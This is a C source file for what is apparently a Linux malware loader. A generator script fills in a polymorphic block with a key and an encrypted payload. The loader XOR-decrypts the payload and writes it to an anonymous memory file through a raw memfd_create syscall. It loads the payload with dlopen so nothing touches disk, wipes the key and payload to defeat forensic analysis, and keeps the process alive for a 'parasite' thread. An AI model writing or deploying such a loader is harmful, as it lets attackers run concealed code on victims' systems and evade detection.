#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <dlfcn.h>

// --- POLYMORPHIC BLOCK START ---
// The script will replace this block with generated arrays and macros
//__POLYMORPHIC_BLOCK__
// --- POLYMORPHIC BLOCK END ---

#ifndef GET_KEY
// Fallback for syntax checking if compiled without forge
#define GET_KEY() NULL
#define GET_PAYLOAD() NULL
#define GET_PAYLOAD_SIZE() 0
#endif

int main(int argc, char* argv[]) {
    // Prevent compiler optimizations from stripping unused variables if they look static
    (void)argc; (void)argv;

    // 1. Decrypt Loop (XOR)
    uint8_t *k = GET_KEY();
    uint8_t *p = GET_PAYLOAD();
    size_t len = GET_PAYLOAD_SIZE();

    if (!k || !p || len == 0) return 1;

    // Simple XOR
    for (size_t i = 0; i < len; i++) {
        p[i] ^= k[i % 16];
    }

    // 2. Execution (memfd_create + dlopen)
    // We use direct syscall for memfd_create (319 on x64) to avoid libc wrappers if possible

    long fd;
    const char *name = ""; // Empty name for anonymity

    // SYS_memfd_create = 319 (x86_64)
    asm volatile (
        "syscall"
        : "=a" (fd)
        : "a" (319), "D" (name), "S" (0x0001) /* MFD_CLOEXEC */
        : "rcx", "r11", "memory"
    );

    if (fd < 0) return 1;

    if (write((int)fd, p, len) != (ssize_t)len) {
        close((int)fd);
        return 1;
    }

    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%ld", fd);

    void* handle = dlopen(fd_path, RTLD_NOW);

    // 3. Cleanup (Deep Clean)
    close((int)fd);

    // Overwrite Key and Payload in memory
    // (volatile to prevent optimization)
    volatile uint8_t *vk = k;
    volatile uint8_t *vp = p;
    size_t n = len;
    while(n--) *vp++ = 0;
    n = 16;
    while(n--) *vk++ = 0;

    if (!handle) return 1;

    // 4. Persistence / Keep Alive
    // The payload (parasite.c) launches a detached thread.
    // We must keep the main process alive so the thread survives.
    pause();

    return 0;
}
